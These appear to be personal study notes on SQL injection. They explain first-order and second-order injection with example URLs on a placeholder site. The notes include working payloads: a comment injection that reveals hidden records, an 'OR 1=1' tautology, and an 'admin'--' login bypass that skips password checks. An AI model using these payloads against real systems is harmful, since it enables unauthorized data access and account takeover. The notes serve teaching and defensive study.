SQL Injection
URL parameters may be modified to change SQL query

First-Order SQL Injection
	The application processes user input from an HTTP request and incorporates the
	input into a SQL query in an unsafe way.

Retrieving Hidden Data Example
	Original 
		https://insecure-website.com/products?category=Gifts
	SQL Query
		SELECT * FROM products WHERE category = 'Gifts' AND released = 1
	To get unreleased products, we can add a comment
		https://insecure-website.com/products?category=Gifts'--
	SQL Query:
		SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
	The comment -- means that the rest of the SQL query is ignored thus 
	AND released = 1 does not get processed

	To display all products in any category, we can add a tautology
		https://insecure-website.com/products?category=Gifts'+OR+1=1--
	SQL Query:
		SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1

	' is a string delimeter
	-- is a comment

Subverting Application Logic
	If an app takes username and password, username parameter for SQL query can 
	be modified with:
		admin'--
	SQL Query:
		SELECT * FROM users WHERE username = 'admin'--' AND password = ''
	This skips the password authentication 


Second-Order SQL Injection
	The application takes user input from an HTTP request and stores it for future
	use. Usually done by placing the input into a db, but no vulnerability occurs
	at the point where the data is stored. Later when handling a different HTTP 
	request, the app retrieves the stored data and incorporates it into a SQL query
	in an unsafe way
